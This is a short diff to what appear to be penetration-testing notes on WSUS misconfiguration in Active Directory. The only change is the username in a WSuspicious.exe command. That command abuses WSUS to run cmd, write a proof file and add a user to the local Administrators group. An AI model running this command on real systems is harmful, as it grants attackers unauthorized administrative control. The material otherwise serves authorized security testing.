@@ -3,7 +3,7 @@
 ## [[09.AD Misconfigurations/WSUS]] [[Misconfigurations/WSUS]]
 1. Add user to Admin and drop file as confirmation:
     ```bash
-    .\WSuspicious.exe /command:" -accepteula -s -d cmd /c ""echo eop_executed > C:\\eop_poc.txt; net localgroup Administratoren ext_nviso_user /add""" /autoinstall
+    .\WSuspicious.exe /command:" -accepteula -s -d cmd /c ""echo eop_executed > C:\\eop_poc.txt; net localgroup Administratoren ext_ecorp_user /add""" /autoinstall
     ```
 
 ```meta
